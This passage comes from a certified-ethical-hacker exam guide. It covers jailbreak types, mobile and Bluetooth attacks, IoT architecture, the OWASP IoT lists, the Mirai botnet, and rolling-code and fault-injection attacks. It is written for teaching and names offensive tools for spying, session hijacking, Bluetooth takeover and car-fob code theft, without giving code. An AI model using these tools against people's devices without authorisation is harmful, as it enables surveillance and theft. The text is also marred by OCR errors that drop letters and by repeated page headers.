bootloaders are called SecureROM and LLB). It uses a vulnerability in iBoot to
turn codesign off, and runs a program that gets everything done. iBoot exploits
can be semi-tethered, and they can be patched by Apple.

• BootROM exploit Allows access to the file system, iBoot, and custom boot logos,
and is found in the device’s first bootloader, SecureROM. This kind of exploit can be
untethered, but cannot be patched by Apple: it’s hardware, not software.

EXAM TIP Jailbreaks within oicial study material can be conusing.
For example, EC-Council states iOS devices cannot be secured against
Userland exploits, but then immediately turns around and says irmware
updates can patch or them. The important thing to remember here is
Userland equates to OS level, and is the only one o the three that does not
provide admin access.

When it comes to mobile vulnerabilities, no matter the platform, it’s almost laugh-
able to ask about them. These are devices owned and operated mainly by users who can
roam at will and can install virtually anything at all on them for any reason. Security
concerns? You betcha. Mobile platforms have gobs of vulnerable attack points warrant-
ing your attention, including everything from server-side controls to client injection and
more. (Refer back to the list of Top 10 mobile risks covered earlier.) A hacker can take
advantage not only of data on the device but also the camera and microphone—how neat
would it be to listen in on or even watch a board meeting, hmm?

08-ch08.indd 312 14/09/21 4:02 PM



All-In-One / CEH™ Certifed Ethical Hacker All-in-One Exam Guide / Walker / 994-3 / Chapter 8

Chapter 8: Mobile Communications and the IoT

313

NOTE An interesting philosophical-type discussion rom our wise tech
editor its well here. “To jailbreak is to ree yoursel rom the tyranny
and whims o a single company with a walled garden. To root is to gain
administrative privileges to your Android device.” In short, Android knows
you’re going to root it and considers it holistically dierent rom iOS and
jailbreaking.

Many of the vulnerabilities and attack vectors covered in previous chapters also apply
to mobile. Just as with web hosts, perhaps the most obvious attack vector comes from the
apps themselves. App stores may not have any vetting of apps at all when entering the
marketplace and are often used to distribute malicious code. From iPhones to Android
devices, users download and install applications for everything from working on docu-
ments to faking a Star Wars lightsaber for impromptu interoffice Jedi battles (Obi-Wan’s
is my personal favorite). Most users don’t even think about it—they just click the link,
install the app, and start playing—and many don’t even bother to read or care about what
the app is asking for, permissions-wise, on the device. Got an app for hacking? You bet
we do, and if it’s tied to a fun-looking application, all the better.

How about social engineering, phishing, and (gulp!) physical security? Mobile users
are as, if not more so, susceptible to all of it as their desktop peers. There’s not really
a community standard mechanism for dealing with spam and phishing, and because
mobile users are always on, it works quite well as an attack vector. What about theft
or loss of the devices themselves? It’s one thing to black widow a website and peruse it
on your own or to grab a SAM file and spend time pounding away on it, but what if
you could just steal the whole dang server? In effect, that’s what’s going on with mobile
devices. In addition to any files or data the user has on the smartphone, it has all the data,
contacts, phone numbers, and e-mails you’d need to set up social engineering attacks in
the future.

EXAM TIP Android’s Device Administration API (https://developer.android
.com/guide/topics/admin/device-admin) provides system-level device
administration. You can use it to create “security-aware” apps that may prove
useul within your organization.

And speaking of attack vectors, as I briefly mentioned earlier, BYOD—bring your
own device—is sweeping across organizations faster than hot doughnuts off the Krispy
Kreme rollers. BYOD allows companies to take advantage, for free, of all that comput-
ing power we’re all walking around with in our hands. The problem with BYOD is
security and control—or the lack thereof by organizations. Sure, organizations are trying
to implement BYOD security and control measures, and many feel like they have the
security situation under control, but the reality of BYOD from a pen testing (or hacking)
perspective is, it’s a good time to be alive.

Mobile device management (MDM) is an effort to add some control to enterprise
mobile devices. Much like Group Policy and such in the Microsoft Windows world,
MDM helps in pushing security policies, application deployment, and monitoring of

08-ch08.indd 313 14/09/21 4:02 PM



All-In-One / CEH™ Certifed Ethical Hacker All-in-One Exam Guide / Walker / 994-3 / Chapter 8

CEH Certified Ethical Hacker All-in-One Exam Guide

314

mobile devices. Most MDM solutions offer the same basic features: passcodes for device
unlocking, remote locking, remote wipe, root or jailbreak detection, policy enforce-
ment, inventory, and monitoring/reporting. Some solutions are Citrix XenMobile, IBM
Security MaaS360, and SOTI MobiControl.

NOTE In prepping or this chapter, I read somewhere that BYOD/MDM
success is only eective when policies are established and supported. While
there’s no doubting the truth o that statement, I can’t count the number o
times I’ve heard, “But we have a policy to prevent that!” When you’re on the
job, please remember—and please advise your clients—that the existence o
a policy is necessary, but in and o itsel means absolutely zero to a bad guy.

For Business Purposes
The popularity of mobile platform applications for business use and the sup-
posed productivity boost they’re capable of providing for organizations has greatly
increased the number of workplace mobile devices in use today. It’s not surprising
that organizations would want to look at mobile computing as a way to increase
productivity. What may be surprising to some of them, though, is what their users
are actually doing with those devices.

According to a recent study by Harvard Business Review, consumers of smart-
phones spend only a fraction of their time either planning for or accomplishing
work activities on their smart devices. An incredible 77 percent of their time is spent
either shopping, socializing, or in the pursuit of “me time” entertainment—whether
they’re at work or not. Want more? How about the fact the fastest-growing demo-
graphic in new Twitter accounts is older than 55? Or that nearly half of all Facebook
use is mobile platform only? Taken together with the fact that many studies now
show social media overtaking porn as the #1 Internet activity, it’s a miracle we get
anything done anymore.

The very devices and open business thought processes we’re putting into place
to spur productivity and increase output are, instead, giving people more time to
play, interact, and shop. This probably doesn’t come as much of a surprise to anyone
who’s spent any time monitoring network activity of business users in a large orga-
nization (some of what the guy in the next cubicle is looking at during work hours
would really amaze you), but it’s all interesting and noteworthy to me, especially
when you think about the lack of security involved in all this playtime.

Want more? Consider the connectivity these devices provide for users. Most folks
hate security and turn off everything they can to make life easier for themselves, and that
goes for Wi-Fi connectivity on phones too. There are tons of open Wi-Fi spots all over
the place that people use with their smartphones and tablets, and sniffing these types of
connections is ridiculously easy. Throw in location awareness and spyware apps, and this
all gets pretty scary pretty quickly.

08-ch08.indd 314 14/09/21 4:02 PM



All-In-One / CEH™ Certifed Ethical Hacker All-in-One Exam Guide / Walker / 994-3 / Chapter 8

Chapter 8: Mobile Communications and the IoT

315

Frightened yet? Heck, we’re not even done with the platform spectrum. Any real
discussion on wireless standards and architecture must at least mention 4G, 5G, and
Bluetooth. 4G and 5G refer to fourth- and fifth-generation mobile telecommunica-
tions, respectively, and offer broadband-type speeds for data usage on mobile devices (cell
phones and such). The actual technology behind these transmission standards is tweaked
from mobile carrier to mobile carrier, so unlike a wireless NIC complying with 802.11g
working with any manufacturer’s access point with the same standard, one company’s
devices may not work with another’s on 4G or 5G.

Bluetooth refers to a very open wireless technology for data exchange over a relatively
short range (10 meters or less). It was designed originally as a means to reduce cabling
but has become a veritable necessity for cell phones and other mobile devices. Part of
what makes Bluetooth so susceptible to hacking is what makes it so ubiquitous—its ease
of use. Bluetooth devices are easy to connect one to another and can even be set to look
for other devices for you automatically. Bluetooth devices have two modes: a discovery
mode and a pairing mode. Discovery mode determines how the device reacts to inquiries
from other devices looking to connect, and it has three actions. The discoverable action
obviously has the device answer to all inquiries, limited discoverable restricts that action,
and nondiscoverable tells the device to ignore all inquiries.

Whereas discovery mode is how the device lets others know it’s available, pairing mode
is how the device reacts when another Bluetooth system asks to pair with it. There are
basically only two versions: yes, I will pair with you, and no, I will not. Nonpairable
rejects every connection request, whereas pairable accepts all of them. Between discovery
and pairing modes, you can see how Bluetooth was designed to make connection easy.

NOTE Don’t just assume Bluetooth is insecure because it can be deined
in a “pairable” mode; in act, the truth is quite the opposite. O course
there’s pairable and nonpairable, but there’s also nondiscoverable and
non-connectable. Bluetooth tends to dierentiate between discoverability,
connectability, and pairability, so while the opportunity to connect may
exist, it’s not simply an open connection.

So in addition to the roughly billion or so new smartphones that will be sold this year,
a growing populace (in and out of the business world) carrying, adjusting, manipulating,
and rooting these devices at will, and the ease with which data can be stored on them
with little to no oversight or security control, you also have to be aware of short-reach
wireless connectivity that may offer virtual control over these devices. We also have virtu-
ally nowhere to hide with them, since 4G and 5G reach nearly everywhere. Sleep well
tonight, security folks. Sleep well.

Mobile Attacks
Attacks on mobile devices abound. First and foremost, phishing attacks and social
engineering are merciless when it comes to mobile devices. I’m sure you’re all familiar
with good-old SMS (text) messaging, but have you ever thought about SMS phishing?
While our users at least think about whether or not they should click a link in e-mail, a

08-ch08.indd 315 14/09/21 4:02 PM



All-In-One / CEH™ Certifed Ethical Hacker All-in-One Exam Guide / Walker / 994-3 / Chapter 8

CEH Certified Ethical Hacker All-in-One Exam Guide

316

text message is another challenge altogether. Almost every vendor from airlines to UPS
packaging gives you an option to get your updates via text, and the practice is growing
quickly. How easy would it be to just send User Joe a text message telling him, “You
have a package coming. Click Here to track”? Definitely something to think about.

The list of Trojans available is almost without end. Notable Android Trojans include
TeaBot, FakeInst, OpFake, Boxer, and KungFu. Spyware is really scary, and tools like
Mobile Spy and SPYERA make it really easy to listen in on or even watch what the target
is doing. And if that’s not enough, the tools we use to manage our own devices can be used
against us. Ever heard of Google Voice? How about tracking where I’m at all the time?
Tools like AndroidLost, Find My Phone, and Where’s My Droid are designed to help me
find my lost phone, but they (and many others) can be used to track where I happen to
be at. Wouldn’t it be helpful to know where folks are at during a social engineering visit
to the site?

And how about using your mobile device as an attack platform? Tools like Network
Spoofer allow you to control how websites appear on a desktop/laptop. DroidSheep
allows you to perform sidejacking by listening to wireless packets and pulling session
IDs. Nmap works great on a mobile device, and sniffers are a dime a dozen. Heck, you
can even install Kali Linux on the thing and turn it into a full-featured hacking machine.

NOTE Ever heard o NetCut? I hadn’t either until reading or this chapter,
and reely admit to having never used it. However, it’s listed in oicial
courseware AND it sounds…nity. Per the NetCut site (https://arcai.com/
netcut/), you can identiy all systems on your current Wi-Fi, identiy which
ones you don’t like, and, with the click o a button, cut them o Wi-Fi. Neat.

Finally, we can’t finish any wireless attack section without visiting our friendly little
Bluetooth devices. After all, think about what Bluetooth is for: connecting devices, usu-
ally mobile (phones), wirelessly over a short distance. And since we keep everything on
our devices (e-mail, calendar appointments, documents, and just about everything else
you might find on a business computer), it should seem fairly obvious, then, that hacking
that signal could pay huge dividends.

Bluetooth definitely falls into the wireless category and has just a few things you’ll
need to consider for your exam and for your career. Although hundreds of tools and
options are available for Bluetooth hacking, the good news is their coverage on the exam
is fairly light, and most of it comes in the form of identifying terms and definitions. The
major Bluetooth attacks are listed here:

• Bluesmacking A simple denial-of-service attack against the device.
• Bluejacking Consists of sending unsolicited messages to, and from,

mobile devices.
• Bluesniffing An effort to discover Bluetooth-enabled devices—much like war

driving in wireless hacking.
• Bluebugging Successfully accessing a Bluetooth-enabled device and remotely

using its features.

08-ch08.indd 316 14/09/21 4:02 PM



All-In-One / CEH™ Certifed Ethical Hacker All-in-One Exam Guide / Walker / 994-3 / Chapter 8

Chapter 8: Mobile Communications and the IoT

317

• Bluesnarfing The actual theft of data from a mobile device due to an open
connection—such as remaining in discoverable mode.

• Blueprinting Think of this as footprinting for Bluetooth: Blueprinting involves
collecting device information over Bluetooth.

Although they’re not covered in depth on your exam, you should know some of the
more common Bluetooth tools available. Of course, your first action should be to find the
Bluetooth devices. BlueScanner (from SourceForge) does a great job of finding devices
around you, but it will also try to extract and display as much information as possible.
BT Browser is another great, and well-known, tool for finding and enumerating nearby
devices. Bluesniff and btCrawler are other options, providing nice GUI formats for your
use. As far as attacks go, Blooover is a good choice for Bluebugging.

In a step up from that, you can start taking advantage of and hacking the devices
nearby. Super Bluetooth Hack is an all-in-one software package that allows you to do
almost anything you want to a device you’re lucky enough to connect to. If the device is a
smartphone, you could read all messages and contacts, change profiles, restart the device,
and even make calls as if they’re coming from the phone itself.

IoT
I suppose before discussing anything, and especially before discussing a topic so impor-
tant EC-Council created a whole new chapter in its official curriculum for it, we’d need
to first define the topic at hand. As noted at the beginning of this chapter, I looked up
several definitions of the Internet of Things (IoT) and found more variations on this
definition than I thought imaginable. Want a try at it? Well, the best I can do is an amal-
gamation of what I’ve read in several resources: the IoT is a collection of devices using
sensors, software, storage, and electronics to collect, analyze, store, and share data among
themselves and, where applicable, with users. Sound far reaching and a little broad? It
probably is, but the reason for that is self-evident: the IoT is everywhere, and expanding
by the minute.

Just look around you right now, wherever you are. Chances are there’s an IoT device
nearby. Your phone, watch, printer, vacuum, refrigerator, toothbrush (maybe), light bulbs,
electrical outlets, thermostat for your A/C unit, and your water heater are all probably
right now, or will be soon, collecting and sharing information. I even read somewhere
there’s now Internet-enabled underwear. And that’s just inside your house. Forget the
cars on the road—that’s too obvious—how about the road they’re driving on, the surveil-
lance cameras, streetlights, traffic signals…? IoT omnipresence is literally endless and
downright mind boggling. So forgive EC-Council, and me, if we can’t really get a handle
on it just yet. It’s literally too much to squeeze down into a short description.

NOTE A term associated with IoT is “wearables,” which reers to the array o
smart watches, itness trackers, and other items worn by a user. I’ve even
seen Internet-enabled earrings.

08-ch08.indd 317 14/09/21 4:02 PM



All-In-One / CEH™ Certifed Ethical Hacker All-in-One Exam Guide / Walker / 994-3 / Chapter 8

CEH Certified Ethical Hacker All-in-One Exam Guide

318

A came across a couple definitions in EC-Council material and online that I think
may add a little clarity, at least to where we’re heading here anyway. One is, the IoT refers
to a network of devices with IP addresses that have the capability of sensing, collecting,
and sending data to each other—basically a web of connected devices made possible by
machine-to-machine communications, large availability of storage, and internetworked
communications. Another source listed IoT as technologies extending Internet connec-
tivity beyond “standard” devices, such as desktops, laptops, smartphones, and tablets,
to any range of traditionally non-network-enabled physical devices and everyday objects.
And I think that is the crux of IoT—we traditionally have thought of certain, specific
devices belonging on a network, and those specific devices behaving accordingly. The
IoT has taken that to a whole new level by making everything internetworked.

So how does this all fit together? And how can we hope to defend it? That’s what the
remainder of this section will help to answer.

IoT Architecture
Since IoT is, by nature, changing all the time and adding ever new and inventive ways to
use devices for data gathering—I can’t wait for Internet-enabled toenail clippers—trying
to nail down an architecture for the whole thing seems like a fool’s errand. I mean, we
can certainly take apart a specific network and look at each device enabled on it, but
the entirety and breadth of each and every one? Impossible. What we can do is look at
some elements that are common across the board and try to categorize them for study
as best we can. This isn’t, and will never be, comprehensive in nature—as fast as the IoT
is growing, I’m certain there will be new information out before this book even gets to
print—but we will follow EC-Council’s lead here and, for the most part, I think you’ll
find it pretty good.

How IoT works comes down to three basic components: things using sensing
technology, IoT gateways, and the cloud (or put another way, data storage availability). A
thing inside the IoT is defined as any device implanted somewhere that has the capa-
bility (and purpose) of communicating on the network. Each IoT device is embedded
with some form of sensing technology, can communicate and interact over the Internet,
and oftentimes can be remotely monitored and controlled. In other words, sensors are
embedded in the devices to measure and forward data (for example, a medical device
sensing a patient’s health statistics or the Nest thermostat implanted in your A/C system
providing information and feedback on its use).

NOTE In one o the more prominent examples o “maybe we should slow
this turnover o all unctions to the machines,” did you hear about the
Nest ailures a ew years back (https://www.nytimes.com/2016/01/14/
ashion/nest-thermostat-glitch-battery-dies-sotware-reeze.html)? Seems
a sotware glitch inside Nest had all the thermostats shut o because they
couldn’t connect to the Internet.

Those things communicating with each other must have a couple items intact in order
to work. The first is some sort of operating system allowing all this data collection and

08-ch08.indd 318 14/09/21 4:02 PM



All-In-One / CEH™ Certifed Ethical Hacker All-in-One Exam Guide / Walker / 994-3 / Chapter 8

Chapter 8: Mobile Communications and the IoT

319

analysis in the first place. EC-Council nicely provides a quick list for your amusement
and perusal:

• RIOT OS It can run on embedded systems, actuator boards, and sensors, uses
energy efficiently, and has very small resource requirements.

• ARM mbed OS This is mostly used on wearables and other devices that are
low-powered.

• RealSense OS X Intel’s depth-sensing version, this is mostly found in cameras
and other sensors.

• Nucleus RTOS This is primarily used in aerospace, medical, and industrial
applications.

• Brillo An Android-based OS, this is generally found in thermostats.
• Contiki This is another OS made for low-power devices; however, it is found

mostly in street lighting and sound monitoring.
• Zephyr This is another option for low-power devices and devices without

many resources.
• Ubuntu Core This is used in robots and drones, and is also known as “snappy.”
• Integrity RTOS This is primarily found in aerospace and medical, defense,

industrial, and automotive sectors.
• Apache Mynewt Devices using Bluetooth Low Energy Protocol make use of this.

And once devices have all that data prepared, they need a network of some sort to
communicate on. Mostly this is done over wireless communications in all its various
forms and generally follows one of four IoT communication models: device to device,
device to gateway, device to cloud, or back-end data sharing. All work exactly as their
name suggests, with only a couple of knowledge nuggets you can tuck away for test pur-
poses. Device to device and device to cloud are pretty straightforward, with the things
communicating directly with each other or shooting their data off directly to a cloud.
Device to gateway adds a collective (aka a gateway device) before sending to a cloud,
which can be used to offer some security controls. Finally, the one outlier, back-end data
sharing, is almost exactly like device to cloud; however, it adds the ability for third par-
ties to collect and use the data. Figure 8-3 displays device to gateway and back-end data
sharing for your comparison.

Once a thing has sensed and collected data, it forwards to the next component, the
IoT gateway. This is designed to send collected data from devices to the user or to the
third component, data storage or cloud, for use later. The cloud stores and analyzes data,
providing information back for future queries. A fitness watch, for example, may provide
you, the user, immediate feedback and information on your workout while simultane-
ously storing details for your comparison and review later.

EXAM TIP File this one away as a deinition you’ll need to remember later:
the Vehicle Ad Hoc Network (VANET) is the communications network used
by our vehicles. It reers to the spontaneous creation o a wireless network
or vehicle-to-vehicle (V2V) data exchange.

08-ch08.indd 319 14/09/21 4:02 PM



All-In-One / CEH™ Certifed Ethical Hacker All-in-One Exam Guide / Walker / 994-3 / Chapter 8

CEH Certified Ethical Hacker All-in-One Exam Guide

320

Device to gateway Back-end data sharing

Third-party
service provider

Application
service provider

Third-party
service provider

Connection is designed to go through a gateway; however, The device communicates with the cloud directly via CoAP or HTTP
in this model, there may be additional connectivity directly (or other protocols), depending on the device type, and the data is

with the cloud, depending on the device type. Protocols can then made available to other parties.
include Bluetooth or 802.11 standards for gateway *This type may or may not also make use of a gateway internally.

communication, and HTTP, CoAP, DTLS, and TLS for device
connectivity, with IPv4 and IPv6 providing network layer

transport.

Figure 8-3 IoT communication models

In addition to the basic components, EC-Council lists a few architecture layers inside
IoT. These aren’t tricky, don’t require weird mental gymnastics to remember, and seem to
make a lot of common sense:

• Edge Technology Layer This layer consists of sensors, RFID tags, readers, and
the devices themselves.

• Access Gateway Layer First data handling takes place in this layer, with message
identification and routing occurring here.

• Internet Layer This is a crucial layer, as it serves as the main component to allow
all communication.

• Middleware Layer This layer sits between the application and hardware layers,
and handles data and device management, data analysis, and aggregation.

• Application Layer This layer is responsible for delivery of services and data to
the user.

Regarding the architecture, just remember how quickly IoT is growing and evolving.
I did a search for IoT trends and found over 60 million pages of information to peruse.
Keep your eye out and read all you can on it. IEEE maintains a journal on all things IoT
(https://ieeexplore.ieee.org/xpl/RecentIssue.jsp?punumber=6488907), and ITU has a great
collection of news articles about current IoT efforts (https://www.itu.int/en/ITU-T/ssc/
resources/Pages/topic-001.aspx). In other words, make use of all these search engines we
have available and try to keep up. It’ll help, both on your exams in the future and your job.

IoT Vulnerabilities and Attacks
Remember OWASP? Well, guess what? They’re back again, this time helping us to iden-
tify vulnerabilities and issues inside the IoT realm. The OWASP IoT Top 10 (https://
wiki.owasp.org/index.php/OWASP_Internet_of_Things_Project#tab=IoT_Top_10)
has been updated since the original release back in 2014 and identifies a brand new

08-ch08.indd 320 14/09/21 4:02 PM



All-In-One / CEH™ Certifed Ethical Hacker All-in-One Exam Guide / Walker / 994-3 / Chapter 8

Chapter 8: Mobile Communications and the IoT

321

list…from 2018. However, as before, the IoT Top 10 list is called out explicitly in the
official courseware; it is listed verbatim here for you:

• I1: Weak, Guessable, or Hardcoded Passwords Use of easily bruteforced,
publicly available, or unchangeable credentials, including backdoors in firmware
or client software that grants unauthorized access to deployed systems.

• I2: Insecure Network Services Unneeded or insecure network services running
on the device itself, especially those exposed to the internet, that compromise
the confidentiality, integrity/authenticity, or availability of information or allow
unauthorized remote control.

• I3: Insecure Ecosystem Interfaces Insecure web, backend API, cloud, or
mobile interfaces in the ecosystem outside of the device that allows compromise
of the device or its related components. Common issues include a lack of
authentication/authorization, lacking or weak encryption, and a lack of input
and output filtering.

• I4: Lack of Secure Update Mechanism Lack of ability to securely update
the device. This includes lack of firmware validation on device, lack of secure
delivery (un-encrypted in transit), lack of anti-rollback mechanisms, and lack of
notifications of security changes due to updates.

• I5: Use of Insecure or Outdated Components Use of deprecated or insecure
software components/libraries that could allow the device to be compromised.
This includes insecure customization of operating system platforms, and the use of
third-party software or hardware components from a compromised supply chain.

• I6: Insufficient Privacy Protection User’s personal information stored on
the device or in the ecosystem that is used insecurely, improperly, or without
permission.

• I7: Insecure Data Transfer and Storage Lack of encryption or access control
of sensitive data anywhere within the ecosystem, including at rest, in transit, or
during processing.

• I8: Lack of Device Management Lack of security support on devices deployed
in production, including asset management, update management, secure
decommissioning, systems monitoring, and response capabilities.

• I9: Insecure Default Settings Devices or systems shipped with insecure default
settings or lack the ability to make the system more secure by restricting operators
from modifying configurations.

• I10: Lack of Physical Hardening Lack of physical hardening measures,
allowing potential attackers to gain sensitive information that can help in a future
remote attack or take local control of the device.

As with the mobile vulnerabilities mentioned previously, be sure to examine every-
thing OWASP has to offer on the project home page: https://owasp.org/www-project-
internet-of-things/. You’ll be able to keep up with the list as it updates and read up on
any new developments that may wriggle their way into your exam.

08-ch08.indd 321 14/09/21 4:02 PM



All-In-One / CEH™ Certifed Ethical Hacker All-in-One Exam Guide / Walker / 994-3 / Chapter 8

CEH Certified Ethical Hacker All-in-One Exam Guide

322

For example, EC-Council has added the OWASP IoT Attack Surface Areas for your
study and reference. The entire list can be found on OWASP’s IoT Project page, although
a couple of references show broken links and may frustrate your efforts to find it. So I
decided to just provide you the direct link here for your use: https://wiki.owasp.org/
index.php/OWASP_Internet_of_Things_Project#tab=IoT_Attack_Surface_Areas).
There are 18 attack surface areas listed by OWASP, listed in Table 8-1 verbatim, that are
referenced within the official courseware.

Attack Surface  Vulnerability

Ecosystem (general) Interoperability standards
Data governance
System wide ailure
Individual stakeholder risks
Implicit trust between components
Enrollment security
Decommissioning system
Lost access procedures

Device Memory Sensitive data:
• Cleartext usernames
• Cleartext passwords
• Third-party credentials
• Encryption keys

Device Physical Interaces Firmware extraction
User CLI
Admin CLI
Privilege escalation
Reset to insecure state
Removal o storage media
Tamper resistance
Debug port:

• UART (Serial)
• JTAG / SWD

Device ID/Serial number exposure

Device Web Interace Standard set o web application vulnerabilities, see:
• OWASP Web Top 10
• OWASP ASVS
• OWASP Testing guide

Credential management vulnerabilities:
• Username enumeration
• Weak passwords
• Account lockout
• Known deault credentials
• Insecure password recovery mechanism

Table 8-1 OWASP IoT Attack Surace Areas

08-ch08.indd 322 14/09/21 4:02 PM



All-In-One / CEH™ Certifed Ethical Hacker All-in-One Exam Guide / Walker / 994-3 / Chapter 8

Chapter 8: Mobile Communications and the IoT

323

Attack Surface  Vulnerability

Device Firmware Sensitive data exposure (see OWASP Top 10 – A6 Sensitive data
exposure):

• Backdoor accounts
• Hardcoded credentials
• Encryption keys
• Encryption (Symmetric, Asymmetric)
• Sensitive inormation
• Sensitive URL disclosure

Firmware version display and/or last update date
Vulnerable services (web, ssh, ttp, etc.)

• Veriy or old sw versions and possible attacks
(Heartbleed, Shellshock, old PHP versions etc.)

Security related unction API exposure
Firmware downgrade possibility

Device Network Services Inormation disclosure
User CLI
Administrative CLI
Injection
Denial o Service
Unencrypted Services
Poorly implemented encryption
Test/Development Services
Buer Overlow
UPnP
Vulnerable UDP Services
DoS
Device Firmware OTA update block
Firmware loaded over insecure channel (no TLS)
Replay attack
Lack o payload veriication
Lack o message integrity check
Credential management vulnerabilities:

• Username enumeration
• Weak passwords
• Account lockout
• Known deault credentials
• Insecure password recovery mechanism

Table 8-1 OWASP IoT Attack Surace Areas (continued)

08-ch08.indd 323 14/09/21 4:02 PM



All-In-One / CEH™ Certifed Ethical Hacker All-in-One Exam Guide / Walker / 994-3 / Chapter 8

CEH Certified Ethical Hacker All-in-One Exam Guide

324

Attack Surface  Vulnerability

Administrative Interace Standard set o web application vulnerabilities, see:
• OWASP Web Top 10
• OWASP ASVS
• OWASP Testing guide

Credential management vulnerabilities:
• Username enumeration
• Weak passwords
• Account lockout
• Known deault credentials
• Insecure password recovery mechanism

Security/encryption options
Logging options
Two-actor authentication
Check or insecure direct object reerences
Inability to wipe device

Local Data Storage Unencrypted data
Data encrypted with discovered keys
Lack o data integrity checks
Use o static same enc/dec key

Cloud Web Interace Standard set o web application vulnerabilities, see:
• OWASP Web Top 10
• OWASP ASVS
• OWASP Testing guide

Credential management vulnerabilities:
• Username enumeration
• Weak passwords
• Account lockout
• Known deault credentials
• Insecure password recovery mechanism

Transport encryption
Two-actor authentication

Third-party Backend APIs Unencrypted PII sent
Encrypted PII sent
Device inormation leaked
Location leaked

Update Mechanism Update sent without encryption
Updates not signed
Update location writable
Update veriication
Update authentication
Malicious update
Missing update mechanism
No manual update mechanism

Table 8-1 OWASP IoT Attack Surace Areas

08-ch08.indd 324 14/09/21 4:02 PM



All-In-One / CEH™ Certifed Ethical Hacker All-in-One Exam Guide / Walker / 994-3 / Chapter 8

Chapter 8: Mobile Communications and the IoT

325

Attack Surface  Vulnerability

Mobile Application Implicitly trusted by device or cloud
Username enumeration
Account lockout
Known deault credentials
Weak passwords
Insecure data storage
Transport encryption
Insecure password recovery mechanism
Two-actor authentication

Vendor Backend APIs Inherent trust o cloud or mobile application
Weak authentication
Weak access controls
Injection attacks
Hidden services

Ecosystem Communication Health checks
Heartbeats
Ecosystem commands
Deprovisioning
Pushing updates

Network Traic LAN
LAN to Internet
Short range
Non-standard
Wireless (WiFi, Z-wave, XBee, Zigbee, Bluetooth, LoRA)
Protocol uzzing

Authentication/ Authentication/Authorization related values (session key, token,
Authorization cookie, etc.) disclosure

Reusing o session key, token, etc.
Device to device authentication
Device to mobile Application authentication
Device to cloud system authentication
Mobile application to cloud system authentication
Web application to cloud system authentication
Lack o dynamic authentication

Privacy User data disclosure
User/device location disclosure
Dierential privacy

Hardware (Sensors) Sensing Environment Manipulation
Tampering (Physically)
Damage (Physical)

Table 8-1 OWASP IoT Attack Surace Areas (continued)

08-ch08.indd 325 14/09/21 4:02 PM



All-In-One / CEH™ Certifed Ethical Hacker All-in-One Exam Guide / Walker / 994-3 / Chapter 8

CEH Certified Ethical Hacker All-in-One Exam Guide

326

How Baby Monitors Brought Down the Internet
On October 21, 2016, millions of people unknowingly had their devices contribute
to one of the largest distributed denial-of-service (DDoS) attacks ever. Devices rang-
ing from security cameras, printers, routers, and even baby monitors infected with
malware launched an attack, later dubbed the Dyn attack. Lasting approximately
3.5 hours (2 hours and 20 minutes for the first wave and 1 hour and 10 minutes for
the second wave), it disrupted numerous large websites and online retailers.

Dyn provides DNS services to over 3500 online companies, including Netflix,
Twitter, and LinkedIn. During the attack, infected devices sent enormous amounts
of fake DNS traffic (TCP and UDP on port 53) to Dyn DNS servers. The attack
was further compounded when the recursive DNS traffic kept retrying before it
could be mitigated. As a result, Dyn DNS servers were overloaded with requests for
name resolution from IoT devices and could no longer answer requests by legiti-
mate users. This means that unless users knew the IP addresses for the websites they
were going to, they were unlikely to reach them.

The network of infected devices perpetrating the attack was referred to as the
Mirai botnet, named after the Mirai malware that had infected the devices (https://
en.wikipedia.org/wiki/Mirai_(malware)). Infected devices were activated, and together
millions of devices launched from homes of unsuspecting users. Mirai targeted IoT
devices by scanning the Internet to discover devices that could be unsecured. When a
device was found, the malware attempted default and weak passwords to gain access
to the device. If these attempts were successful, the malware dropped a payload and
opened a backdoor on the device (https://blog.malwaremustdie.org/2016/08/mmd-
0056-2016-linuxmirai-just.html). The infected device could then be used to launch
more attacks, either infecting more devices or receiving instructions from a command
and control server.

If you think that’s the end of it, think again. These types of stories are just the
beginning, and it’s up to security professionals like you to either prevent their occur-
rence or limit the damage they can cause.

Get ready, because I think the toaster is eyeballing me…

Lastly in this section, we need to cover some of the attacks against IoT. For the most
part, virtually every attack we’ve discussed (or will discuss later) in this book can be lever-
aged against IoT—or make use of IoT devices to work. For example, DDoS (distributed
denial of service) in IoT isn’t any different from any other DDoS against or using “nor-
mal” devices. In the IoT world, though, you can leverage your toaster and all these other
little data producers and collectors to carry out outlandish DDoS attacks. In one version
of this, noted as the Sybil attack in EC-Council’s curriculum, multiple forged identities
are used to create the illusion of traffic congestion that affects everyone else in the local
IoT network.

08-ch08.indd 326 14/09/21 4:02 PM



All-In-One / CEH™ Certifed Ethical Hacker All-in-One Exam Guide / Walker / 994-3 / Chapter 8

Chapter 8: Mobile Communications and the IoT

327

EXAM TIP EC-Council also notes HVAC attacks in IoT attacks. It’s pretty much
exactly what it sounds like—hack IoT devices in order to shut down air
conditioning services.

A couple other attacks specifically called out are rolling code and BlueBorne. The
code used by your key fob to unlock (and in some cases) start your car is called a
rolling (or hopping) code. An attack can sniff for the first part of the code, jam the
key fob, and sniff/copy the second part on subsequent attempts, allowing the attacker
to steal the code—and your car. One of the better ways to pull this one off is to use
hardware designed for a wide radio range spectrum, like the HackRF One (https://
greatscottgadgets.com/hackrf/). A BlueBorne attack is basically an amalgamation of
techniques and attacks against known, already existing Bluetooth vulnerabilities.

EXAM TIP A ault injection (aka perturbation) attack occurs when a
malicious actor injects a aulty signal into the system. These attacks come
in our main types: optical, electromagnet ault injection (EMFI), or body
bias injection (BBI; using laser or electromagnetic pulses); power or clock
glitching (aecting power supply or clock); requency or voltage tampering
(tampering with operating conditions themselves); and temperature attacks
(altering temperature or the chip).

Ransomware, side channel, man in the middle (MITM), and so on, all still apply here,
as they do everywhere else. And let’s not forget malware. Just like their wired cousins, IoT
devices can fall prey to malware. For example, Mirai malware purposefully looks for and
interjects itself onto IoT devices. After successful infiltration, it basically propagates and
creates gigantic botnets—with the primary purpose of DDoS attacks thereafter.

IoT Hacking Methodology
Lastly in this section, things just wouldn’t be right without a good old-fashioned CEH
methodology to commit to memory. I can’t really blame EC-Council for this—a meth-
odology is after all, and as previously mentioned, not necessarily a step-by-step, rote
list to follow in order. Rather, it’s a good means to ensure you cover all your bases and
make sure the test moves forward comprehensively. When it comes to this IoT hacking
methodology, the steps will probably look really familiar to you: information gathering,
vulnerability scanning, launching attacks, gaining access, and maintaining access.

The information gathering phase is exactly what it sounds like: call it reconnais-
sance and footprinting for IoT devices. And just how would one pull this off? Glad you
asked—remember Shodan from Chapter 2?

Suppose you were sitting at home one night watching a cooking show and you saw
a baker talking about a sweet, delicious ganache. After a brief sip on your bourbon, you
think to yourself, “What the heck is a ganache? How does one make ganache? Where was
ganache invented, by whom, and why?” If you wanted all the answers to those questions,
